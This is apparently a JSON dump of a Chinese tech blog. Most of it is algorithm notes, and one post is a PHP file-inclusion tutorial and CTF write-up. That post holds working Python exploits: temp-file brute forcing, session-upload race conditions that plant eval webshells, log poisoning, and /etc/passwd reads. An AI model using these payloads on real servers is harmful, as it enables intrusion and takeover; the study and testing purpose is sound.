Arrays.sort(mySs); System.out.print(\"最大数：\"); for (int i = 0; i &lt; mySs.length; i++) &#123; System.out.print(mySs[i].s); &#125; &#125;&#125;class MyString implements Comparable&lt;MyString&gt;&#123; public String s; public MyString(String s) &#123; this.s = s; &#125; @Override public int compareTo(MyString o) &#123; if(o==null||o.s==null) &#123; return 1; &#125; String tmp1 = s+o.s; String tmp2 = o.s+s; return -tmp1.compareTo(tmp2); &#125;&#125; 类似题求最小的组合数 123456789101112131415161718import java.util.Arrays;public class Solution &#123; public String PrintMinNumber(int[] numbers) &#123; if (numbers == null || numbers.length == 0) return \"\"; int n = numbers.length; String[] nums = new String[n]; for (int i = 0; i &lt; n; i++) nums[i] = numbers[i] + \"\"; Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1)); String ret = \"\"; for (String str : nums) ret += str; return ret; &#125;&#125; 已知树的先序和中序，求后序java实现已知先序遍历和中序遍历，求后序遍历思路:先根据先序和中序序列，构建二叉树，然后在中序遍历二叉树 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Solution &#123; public Node initTree(int[] preOrder,int pstart,int pend,int[] inOrder,int instart,int inend)&#123; if(pstart&gt;pend||instart&gt;inend)&#123; return null; &#125; int rootData=preOrder[pstart]; Node head=new Node(rootData); int rootIndex=findIndexInArray(inOrder,rootData,instart,inend); int offSet=rootIndex-instart-1; Node left=initTree(preOrder,pstart+1,pstart+offSet+1,inOrder,instart,instart+offSet); Node right=initTree(preOrder,pstart+offSet+2,pend,inOrder,rootIndex+1,inend); head.left=left; head.right=right; return head; &#125; private int findIndexInArray(int[] inOrder,int rootData,int instart,int inend)&#123; for(int i=instart;i&lt;=inend;i++)&#123; if(inOrder[i]==rootData)&#123; return i; &#125; &#125; return -1; &#125; public void postOrder(Node root)&#123; if(root!=null)&#123; postOrder(root.left); System.out.print(root.val+\" \"); postOrder(root.right); &#125; &#125; public static void main(String[] args) &#123; int[] preOrder = &#123;1,2,4,8,9,5,10,3,6,7&#125;; int[] inOrder = &#123;8,4,9,2,10,5,1,6,3,7&#125;; Solution tree=new Solution(); Node root=tree.initTree(preOrder,0,preOrder.length-1,inOrder,0,inOrder.length-1); tree.postOrder(root); &#125;&#125; 动态规划背包问题01背包wen背包问题集合 经典算法总结——背包问题java实现 最后一块石头1234567891011121314151617181920212223class Solution &#123; public int lastStoneWeightII(int[] stones) &#123; /* 由于石头拿走还能放回去，因此可以简单地把所有石头看作两堆 * 假设总重量为 sum, 则问题转化为背包问题：如何使两堆石头总重量接近 sum / 2 */ int len = stones.length; /* 获取石头总重量 */ int sum = 0; for (int i : stones) &#123; sum += i; &#125; /* 定义 dp[i] 重量上限为 i 时背包所能装载的最大石头重量 */ int maxCapacity = sum/2; int[] dp = new int[maxCapacity + 1]; for (int i = 0; i &lt; len; i++) &#123; int curStone = stones[i]; for (int j = maxCapacity; j &gt;= curStone; j--) &#123; dp[j] = Math.max(dp[j], dp[j-curStone] + curStone); &#125; &#125; return sum - 2 * dp[maxCapacity]; &#125;&#125; https://leetcode-cn.com/problems/last-stone-weight-ii/ 力扣 5063 最后一块石头的重量 &amp; II sigle numberhttps://blog.csdn.net/crayondeng/article/details/39289387 http://ddrv.cn/a/113829参考文章","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[],"author":"ye1s"},{"title":"图","slug":"图","date":"2019-09-16T11:29:00.000Z","updated":"2020-04-13T07:50:41.000Z","comments":true,"path":"article/ee040603.html","link":"","permalink":"https://blog.cfyqy.com/article/ee040603.html","excerpt":"","text":"基本概念https://www.cnblogs.com/ysocean/p/8032659.html 例题二分图 判断是否为二分图 拓扑排序 课程安排的合法性 课程安排的顺序 并查集 冗余连接 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%9B%BE.md#%E4%BA%8C%E5%88%86%E5%9B%BE参考文章:Java数据结构和算法（十五）——无权无向图","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"图","slug":"图","permalink":"https://blog.cfyqy.com/tags/%E5%9B%BE/"}],"author":"ye1s"},{"title":"文件包含漏洞","slug":"包含漏洞总结","date":"2019-09-16T09:24:46.000Z","updated":"2021-05-12T16:42:30.586Z","comments":true,"path":"article/f5a2dfc5.html","link":"","permalink":"https://blog.cfyqy.com/article/f5a2dfc5.html","excerpt":"照搬大佬的文章，总结得太详细了。敬佩。","text":"照搬大佬的文章，总结得太详细了。敬佩。 参考文章:php文件包含漏洞https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ /proc/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。注意：如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self/代替/proc/[pid]/即可。 12345678对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx-pxxxx登录MySQL，会在cmdline中显示明文密码：/proc/[pid]/cmdline ([pid]指向进程所对应的终端命令)有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：/proc/[pid]/cmd/ ([pid]指向进程的运行目录）环境变量中可能存在secret_key，这时也可以通过environ进行读取：/proc/[pid]/environ ([pid]指向进程运行时的环境变量)/proc/[pid]/fd/[num]读取，这个目录包含了进程打开的每一个文件的链接/proc/[pid]/cwd/文件名 — 指向当前进程运行目录的一个符号链接 /proc/self/environ需要有/proc/self/environ的读取权限 如果可以读取，修改User-Agent为php代码，然后lfi点包含，实现rce /proc/self/fd/1,2,3…需要有/proc/self/fd/1的读取权限 类似于/proc/self/environ，不同是在referer或报错等写入php代码，然后lfi点包含，实现rce /proc/self/cwd/文件名/proc/self/cwd/flag.py指向当前进程运行目录的一个符号链接,如果知道该进程的相关文件名，不知道目录位置，可以这样读 伪协议php://filter用来读文件 不需要allow_url_include和allow_url_fopen开启 1php://filter/read=convert.base64-encode/resource= php://input可以实现代码执行 需要allow_url_include：on 12345678data:&#x2F;&#x2F;需要allow_url_fopen,allow_url_include均开启data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;d·ata:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; expect://默认不开启，需要安装PECL package扩展需要allow_url_include开启 1expect:&#x2F;&#x2F;[command] /var/log/ssh日志需要有/var/log/auth.log的读取权限 如果目标机开启了ssh，可以通过包含ssh日志的方式来getshell 连接ssh时输入ssh &lt;?php phpinfo(); ?&gt;@192.168.211.146 php代码便会保存在/var/log/auth.log中 然后lfi点包含，实现rce apache日志需要有/var/log/apache2/…的读取权限 包含access.log和error.log来rce 但log文件过大会超时返回500，利用失败 更多日志文件地址见：https://github.com/tennc/fuzzdb/blob/master/attack-payloads/lfi/common-unix-httpd-log-locations.txt with phpinfoPHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下 请求到达； 创建临时文件，并写入上传文件的内容；文件为/tmp/php[w]{6} 调用相应PHP脚本进行处理，如校验名称、大小等； 删除临时文件。 https://www.anquanke.com/post/id/177491#h2-10 with php崩溃php Segfault向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留 1.php &lt; 7.2 1php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd 2.php7 老版本通杀 1php:&#x2F;&#x2F;filter&#x2F;convert.quoted-printable-encode&#x2F;resource&#x3D;data:&#x2F;&#x2F;,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA 更新之后的版本已经修复，不会再使php崩溃了，这里我使用老版本来测试可以利用 包含上面两条payload可以使php崩溃，请求中同时存在一个上传文件的请求则会使临时文件保存，然后爆破临时文件名，包含来rce exp: 123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-# php崩溃 生成大量临时文件import requestsimport stringdef upload_file(url, file_content): files = &#123;'file': ('daolgts.jpg', file_content, 'image/jpeg')&#125; try: requests.post(url, files=files) except Exception as e: print echarset = string.digits+string.letterswebshell = '&lt;?php eval($_REQUEST[daolgts]);?&gt;'.encode(\"base64\").strip()file_content = '&lt;?php if(file_put_contents(\"/tmp/daolgts\", base64_decode(\"%s\")))&#123;echo \"success\";&#125;?&gt;' % (webshell)url=\"http://192.168.211.146/lfi.php\"parameter=\"file\"payload1=\"php://filter/string.strip_tags/resource=/etc/passwd\"payload2=r\"php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA\"lfi_url = url+\"?\"+parameter+\"=\"+payload1length = 6times = len(charset) ** (length / 2)for i in xrange(times): print \"[+] %d / %d\" % (i, times) upload_file(lfi_url, file_content) 爆破tmp文件名然后爆破临时文件名来包含 12345678910111213141516171819202122232425# -*- coding: utf-8 -*-import requestsimport stringcharset = string.digits + string.lettersbase_url=\"http://192.168.211.146/lfi.php\"parameter=\"file\"for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = base_url+\"?\"+parameter+\"=/tmp/php\"+filename print url try: response = requests.get(url) if 'success' in response.content: print \"[+] Include success!\" print \"url:\"+url exit() except Exception as e: print e session如果session.upload_progress.enabled=On开启，就可以包含session来getshell,并且这个参数在php中是默认开启的 https://php.net/manual/zh/session.upload-progress.php 当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix与session.upload_progress.name连接在一起的值。 也就是说session中会添加session.upload_progress.prefix+$_POST[ini_get[&#39;session.upload_progress.name&#39;]],而session.upload_progress.name是可控的，所以就可以在session写入php代码，然后包含session文件来rce session.upload_progress.prefix和session.upload_progress.name还有session的储存位置session.save_path都能在phpinfo中获取，默认为:同时能看到session.upload_progress.cleanup是默认开启的，这个配置就是POST请求结束后会把session清空，所以session的存在时间很短，需要条件竞争来读取 下面测试一下，构造一个html来发包 123456&lt;form action=\"http://192.168.211.146/phpinfo.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"&lt;?php phpinfo(); ?&gt;\" /&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 在数据包里加入PHPSESSION，才能生成session文件 burp不断发包，成功包含 exp: 123456789101112131415161718192021222324252627282930313233343536373839import requestsimport threadingwebshell = '&lt;?php eval($_REQUEST[daolgts]);?&gt;'.encode(\"base64\").strip()file_content = '&lt;?php if(file_put_contents(\"/tmp/daolgts\", base64_decode(\"%s\")))&#123;echo \"success\";&#125;?&gt;' % (webshell)url='http://192.168.211.146/lfi.php'r=requests.session()def POST(): while True: file=&#123; \"upload\":('daolgts.jpg', file_content, 'image/jpeg') &#125; data=&#123; \"PHP_SESSION_UPLOAD_PROGRESS\":file_content &#125; headers=&#123; \"Cookie\":'PHPSESSID=123456' &#125; r.post(url,files=file,headers=headers,data=data)def READ(): while True: event.wait() t=r.get(\"http://192.168.211.146/lfi.php?file=/var/lib/php/sessions/sess_123456\") if 'success' not in t.text: print('[+]retry') else: print(t.text) event.clear()event=threading.Event()event.set()threading.Thread(target=POST,args=()).start()threading.Thread(target=POST,args=()).start()threading.Thread(target=POST,args=()).start()threading.Thread(target=READ,args=()).start()threading.Thread(target=READ,args=()).start()threading.Thread(target=READ,args=()).start() 例题[NPUCTF2020]ezinclude方法一php版本是7.0.33，大于5.4，可以尝试利用session.upload_progress进行session文件包含： 12345678910111213141516171819202122232425262728293031323334import ioimport sysimport requestsimport threadinghost = 'http://4da37c54-0605-4773-b4a7-11235251b69c.node3.buuoj.cn/flflflflag.php'sessid = 'feng'def POST(session): while True: f = io.BytesIO(b'a' * 1024 * 50) session.post( host, data=&#123;\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('ls /');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');echo md5('1');?&gt;\"&#125;, files=&#123;\"file\":('a.txt', f)&#125;, cookies=&#123;'PHPSESSID':sessid&#125; )def READ(session): while True: response = session.get(f'&#123;host&#125;?file=/tmp/sess_&#123;sessid&#125;') # print(response.text) if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text: print('[+++]retry') else: print(response.text) sys.exit(0)with requests.session() as session: t1 = threading.Thread(target=POST, args=(session, )) t1.daemon = True t1.start() READ(session) 写进shell.php，执行phpinfo即可找到flag。 方法二： 1234567891011import requestsfrom io import BytesIOimport refile_data=&#123; 'file': BytesIO(b\"&lt;?php eval($_POST[cmd]);\")&#125;url=\"http://1e9ab8e3-1c1c-485c-bb3b-c2ed35ce3a39.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"try: r=requests.post(url=url,files=file_data,allow_redirects=False)except Exception as e: print(e) 有dir.php，可得/tmp目录下的文件，最后flag在phpinfo中 参考文章：https://www.anquanke.com/post/id/177491","categories":[],"tags":[],"author":"ye1s"},{"title":"分支限界法","slug":"分支限界法","date":"2019-09-16T03:13:00.000Z","updated":"2020-04-13T07:51:20.000Z","comments":true,"path":"article/d0252485.html","link":"","permalink":"https://blog.cfyqy.com/article/d0252485.html","excerpt":"","text":"基本概念https://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741378.html 例题01背包，最大团，单源最短路径，装载问题，布线问题https://blog.csdn.net/zxzxzx0119/article/details/80102094","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"分支限界算法","slug":"分支限界算法","permalink":"https://blog.cfyqy.com/tags/%E5%88%86%E6%94%AF%E9%99%90%E7%95%8C%E7%AE%97%E6%B3%95/"}],"author":"ye1s"},{"title":"快慢指针","slug":"慢","date":"2019-09-16T03:06:00.000Z","updated":"2020-04-13T07:51:40.000Z","comments":true,"path":"article/2cf5288b.html","link":"","permalink":"https://blog.cfyqy.com/article/2cf5288b.html","excerpt":"","text":"基本概念快慢指针中的快慢指的是移动的步长，即每次向前移动速度的快慢。例如可以让快指针每次沿链表向前移动2，慢指针每次向前移动1次。 例题详情看:快慢指针关于快慢指针的若干应用详解 判断单链表是否为循环链表1234567891011121314int isExitsLoop(LinkList L) &#123; LinkList fast, slow; fast = slow = L; while (fast &amp;&amp; fast-&gt;next) &#123; slow = slow-&gt;next; fast = fast-&gt;next-&gt;next; if (slow == fast) &#123; break; &#125; &#125; return ((fast == NULL) || (fast-&gt;next == NULL));&#125; 在有序链表中寻找中位数12345678910111213while (fast&amp;&amp;slow)&#123; if (fast-&gt;next==NULL) return slow -&gt;data; else if (fast-&gt;next!= NULL &amp;&amp; fast-&gt;next-&gt;next== NULL) return (slow -&gt;data + slow -&gt;next-&gt;data)/2; else &#123; fast= fast-&gt;next; fast= fast-&gt;next; slow = slow -&gt;next; &#125; &#125; 如果链表为存在环，如果找到环的入口点12345678910111213141516171819node* findLoopPort(node *head) &#123; node *fast, *slow; fast = slow = head; while (fast &amp;&amp; fast-&gt;next) &#123; slow = slow-&gt;next; fast = fast-&gt;next-&gt;next; if (slow == fast) &#123; break; &#125; &#125; if ((fast == NULL) || (fast-&gt;next == NULL)) &#123; return NULL; &#125; slow = head; while (slow != fast) &#123; slow = slow-&gt;next; fast = fast-&gt;next; &#125; return slow; 输出链表中的倒数第K个节点(即正数第K-1个节点)12345678910111213141516171819// 查找单链表中倒数第K个结点 ListNode * RGetKthNode(ListNode * pHead, unsigned int k) // 函数名前面的R代表反向 &#123; if(k == 0 || pHead == NULL) // 这里k的计数是从1开始的，若k为0或链表为空返回NULL return NULL; ListNode * pAhead = pHead; ListNode * pBehind = pHead; for(int i=0;i&lt;k-1;i++)&#123; pAhead=pAhead-&gt;next; if(pAhead==null) return null;//当链表长度小于k时候，返回Null &#125; while(pAhead-&gt;next != NULL) // 前后两个指针一起向前走，直到前面的指针指向最后一个结点 &#123; pBehind = pBehind-&gt;next; pAhead = pAhead-&gt;next; &#125; return pBehind; // 后面的指针所指结点就是倒数第k个结点 &#125; 参考文章:快慢指针关于快慢指针的若干应用详解","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"快慢指针","slug":"快慢指针","permalink":"https://blog.cfyqy.com/tags/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88/"}],"author":"ye1s"},{"title":"数组","slug":"数组","date":"2019-09-15T13:33:00.000Z","updated":"2020-04-13T07:52:22.000Z","comments":true,"path":"article/340249a9.html","link":"","permalink":"https://blog.cfyqy.com/article/340249a9.html","excerpt":"","text":"基本概念https://www.cnblogs.com/ysocean/p/7894448.html 例题 把数组中的 0 移到末尾 改变矩阵维度 找出数组中最长的连续 1 有序矩阵查找 有序矩阵的 Kth Element 一个数组元素在 [1, n] 之间，其中一个数被替换为另一个数，找出重复的数和丢失的数 找出数组中重复的数，数组值在 [1, n] 之间 数组相邻差值的个数 数组的度 对角元素相等的矩阵 嵌套数组 分隔数组 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5.md#1-%E6%8A%8A%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84-0-%E7%A7%BB%E5%88%B0%E6%9C%AB%E5%B0%BE","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数组","slug":"数组","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E7%BB%84/"}],"author":"ye1s"},{"title":"哈希表","slug":"表","date":"2019-09-14T04:11:00.000Z","updated":"2020-04-13T07:52:40.000Z","comments":true,"path":"article/850f2080.html","link":"","permalink":"https://blog.cfyqy.com/article/850f2080.html","excerpt":"","text":"基本概念https://www.cnblogs.com/ysocean/p/8032656.html#_label3 例题 数组中两个数的和为给定值 判断数组是否含有重复元素 最长和谐序列 最长连续序列 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%93%88%E5%B8%8C%E8%A1%A8.md","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"哈希表","slug":"哈希表","permalink":"https://blog.cfyqy.com/tags/%E5%93%88%E5%B8%8C%E8%A1%A8/"}],"author":"ye1s"},{"title":"栈和队列","slug":"列","date":"2019-09-12T09:59:00.000Z","updated":"2020-04-13T07:53:07.000Z","comments":true,"path":"article/b6c47025.html","link":"","permalink":"https://blog.cfyqy.com/article/b6c47025.html","excerpt":"","text":"相关概念栈的相关介绍:https://www.cnblogs.com/ysocean/p/7911910.html队列的相关介绍:https://www.cnblogs.com/ysocean/p/7921930.html 例题 用栈实现队列 用队列实现栈 最小值栈 用栈实现括号匹配 数组中元素与下一个比它大的元素之间的距离 循环数组中比当前元素大的下一个元素 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97.md#1-%E7%94%A8%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"队列","slug":"队列","permalink":"https://blog.cfyqy.com/tags/%E9%98%9F%E5%88%97/"}],"author":"ye1s"},{"title":"树","slug":"树","date":"2019-09-07T06:35:00.000Z","updated":"2020-04-13T08:28:27.412Z","comments":true,"path":"article/7b216a3b.html","link":"","permalink":"https://blog.cfyqy.com/article/7b216a3b.html","excerpt":"","text":"二叉树的概念https://www.cnblogs.com/ysocean/p/8032642.html 例题递归 树的高度 平衡树 两节点的最长路径 翻转树 归并两棵树 判断路径和是否等于一个数 统计路径和等于一个数的路径数量 子树 树的对称 最小路径 统计左叶子节点的和 相同节点值的最大路径长度 间隔遍历 找出二叉树中第二小的节点 层次遍历 一棵树每层节点的平均数 得到左下角的节点 前中后序遍历 非递归实现二叉树的前序遍历 非递归实现二叉树的后序遍历 非递归实现二叉树的中序遍历 BST 修剪二叉查找树 寻找二叉查找树的第 k 个元素 把二叉查找树每个节点的值都加上比它大的节点的值 二叉查找树的最近公共祖先 二叉树的最近公共祖先 从有序数组中构造二叉查找树 根据有序链表构造平衡的二叉查找树 在二叉查找树中寻找两个节点，使它们的和为一个给定值 在二叉查找树中查找两个节点之差的最小绝对值 寻找二叉查找树中出现次数最多的值 Trie 实现一个 Trie 实现一个 Trie，用来求前缀和 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%91.md#1-%E6%A0%91%E7%9A%84%E9%AB%98%E5%BA%A6","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"树","slug":"树","permalink":"https://blog.cfyqy.com/tags/%E6%A0%91/"}],"author":"ye1s"},{"title":"链表","slug":"链表","date":"2019-09-05T05:22:00.000Z","updated":"2020-04-13T08:32:31.866Z","comments":true,"path":"article/2362a8ea.html","link":"","permalink":"https://blog.cfyqy.com/article/2362a8ea.html","excerpt":"","text":"链表概念 链表（Linked list）是一种常见的基础数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的指针(Pointer)。 使用链表结构可以克服数组需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。 单向链表 单链表是链表中结构最简单的。一个单链表的节点(Node)分为两个部分，第一个部分(data)保存或者显示关于节点的信息，另一个部分存储下一个节点的地址。最后一个节点存储地址的部分指向空值。 单向链表只可向一个方向遍历，一般查找一个节点的时候需要从第一个节点开始每次访问下一个节点，一直访问到需要的位置。而插入一个节点，对于单向链表，我们只提供在链表头插入，只需要将当前插入的节点设置为头节点，next指向原头节点即可。删除一个节点，我们将该节点的上一个节点的next指向该节点的下一个节点。 头插法和尾插法头插法：头插法的实现相对简单 思路是将新形成的节点的下一个赋值为header再把新形成的节点地址传给header即将header向前移动 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import java.util.Random;import java.util.Scanner; public class Link &#123; //创建一个存储数据的属性 int data; //创建存储下一个节点地址的属性 Link next; static int length=0; /** * 创建一个链表 * @param len 产生数据的长度 * @return 链表第一个节点地址 */ public static Link creat(int len)&#123; //定义随机对象 Random r=new Random(); //定义链表的节点 Link newnode,header; //header永远存储第一个节点的地址，tailer永远存储最后一个节点的地址 header=null; for (int i = 0; i &lt; len; i++) &#123; //生成一个随机数字 int temp=r.nextInt(100); //创建一个临时节点 newnode=new Link(); //长度 length++; //为属性赋值 newnode.data=temp; //判断当前链表是否第一次赋值 if(header==null)&#123; header=newnode; &#125;else&#123; //将新节点连接到链表的头部 newnode.next=header; //header永远存储第一个节点的地址 header=newnode; &#125; &#125; return header; &#125; public static void main(String[] args) &#123; Scanner sc=new Scanner(System.in); System.out.println(\"输入长度：\"); int l=sc.nextInt(); System.out.println(\"打印数组：\"); //调用数组生成方法 传入键盘值l Link head=Link.creat(l); for (int i = 0; i &lt; Link.length; i++) &#123; System.out.print(head.data+\" \"); //把当前对象的下一个对象地址传给当前对象 head=head.next; &#125; &#125;&#125; 尾插法： 尾插法相对于头插法有些许不同 因为要返回头 头不能动 所以需要一个tailer来记录最后一个值 tailer右移 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import java.util.Random;import java.util.Scanner; public class Link &#123; //创建一个存储数据的属性 int data; //创建存储下一个节点地址的属性 Link next; static int length=0; /** * 创建一个链表 * @param len 产生数据的长度 * @return 链表第一个节点地址 */ public static Link creat(int len)&#123; //定义随机对象 Random r=new Random(); //定义链表的节点 Link newnode,header,tailer; //header永远存储第一个节点的地址，tailer永远存储最后一个节点的地址 header=tailer=null; for (int i = 0; i &lt; len; i++) &#123; //生成一个随机数字 int temp=r.nextInt(100); //创建一个临时节点 newnode=new Link(); //长度 length++; //为属性赋值 newnode.data=temp; //判断当前链表是否第一次赋值 if(header==null)&#123; header=tailer=newnode; &#125;else&#123; //将新节点连接到链表的尾部 tailer.next=newnode; //tailer永远存储最后一个节点的地址 tailer=newnode; &#125; &#125; return header; &#125; public static void main(String[] args) &#123; Scanner sc=new Scanner(System.in); System.out.println(\"输入长度：\"); int l=sc.nextInt(); System.out.println(\"打印数组：\"); //调用数组生成方法 传入键盘值l Link head=Link.creat(l); for (int i = 0; i &lt; Link.length; i++) &#123; System.out.print(head.data+\" \"); //把当前对象的下一个对象地址传给当前对象 head=head.next; &#125; &#125;&#125; 例题 找出两个链表的交点 链表反转 归并两个有序的链表 从有序链表中删除重复节点 删除链表的倒数第 n 个节点 交换链表中的相邻结点 链表求和 回文链表 分隔链表 链表元素按奇偶聚集 https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E9%93%BE%E8%A1%A8.md#1-%E6%89%BE%E5%87%BA%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E4%BA%A4%E7%82%B9 参考文章: Java数据结构和算法(七)java 手动实现单链表（尾插法和头插法）","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"链表","slug":"链表","permalink":"https://blog.cfyqy.com/tags/%E9%93%BE%E8%A1%A8/"}],"author":"ye1s"},{"title":"数学","slug":"数学","date":"2019-09-04T09:45:00.000Z","updated":"2020-04-13T07:53:26.000Z","comments":true,"path":"article/fe7e69f4.html","link":"","permalink":"https://blog.cfyqy.com/article/fe7e69f4.html","excerpt":"","text":"转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E5%AD%A6.md#%E7%B4%A0%E6%95%B0%E5%88%86%E8%A7%A3","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://blog.cfyqy.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数学","slug":"数学","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E5%AD%A6/"}],"author":"ye1s"},{"title":"回溯","slug":"回溯","date":"2019-09-02T06:51:00.000Z","updated":"2020-04-13T07:53:41.000Z","comments":true,"path":"article/f92eff5d.html","link":"","permalink":"https://blog.cfyqy.com/article/f92eff5d.html","excerpt":"","text":"概念 回溯算法实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已不满足求解条件时，就“回溯”返回，尝试别的路径。 回溯法是一种选优搜索法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。 许多复杂的，规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。 基本思想 在包含问题的所有解的解空间树中，按照深度优先搜索的策略，从根结点出发深度探索解空间树。当探索到某一结点时，要先判断该结点是否包含问题的解，如果包含，就从该结点出发继续探索下去，如果该结点不包含问题的解，则逐层向其祖先结点回溯。（其实回溯法就是对隐式图的深度优先搜索算法）。 若用回溯法求问题的所有解时，要回溯到根，且根结点的所有可行的子树都要已被搜索遍才结束。 而若使用回溯法求任一个解时，只要搜索到问题的一个解就可以结束。 一般步骤：（1）针对所给问题，确定问题的解空间： 首先应明确定义问题的解空间，问题的解空间应至少包含问题的一个（最优）解。 （2）确定结点的扩展搜索规则 （3）以深度优先方式搜索解空间，并在搜索过程中用剪枝函数避免无效搜索。 算法框架递归 12345678910111213141516171819int a[n];try(int 